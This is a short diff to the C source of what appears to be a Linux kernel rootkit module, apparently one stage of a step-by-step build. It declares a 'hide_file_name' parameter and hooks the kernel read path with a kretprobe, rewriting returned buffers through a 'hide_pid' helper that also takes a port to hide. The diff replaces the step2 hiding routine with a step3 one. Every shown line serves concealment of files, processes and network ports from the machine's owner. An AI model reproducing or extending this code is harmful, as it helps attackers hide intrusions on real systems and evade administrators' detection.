@@ -24,7 +24,7 @@
 
 #include "helpers.h"
 #include "step1.h"
-#include "step2.h"
+#include "step3.h"
 
 static char* hide_file_name = "FILE";
 module_param(hide_file_name, charp, S_IRWXU);
@@ -139,10 +139,10 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
     if(buffer_count == 0)
         return 0;
 
-    ssize_t new_size_step2 = step2_hide_pid(sb->s_id, path, args->buffer_ptr, buffer_count, port_to_hide);
+    ssize_t new_size_step3 = step3_hide_pid(sb->s_id, path, args->buffer_ptr, buffer_count, port_to_hide);
 
-    if(new_size_step2 != -1){
-        regs_set_return_value(regs, new_size_step2);
+    if(new_size_step3 != -1){
+        regs_set_return_value(regs, new_size_step3);
         return 0;
     }
 
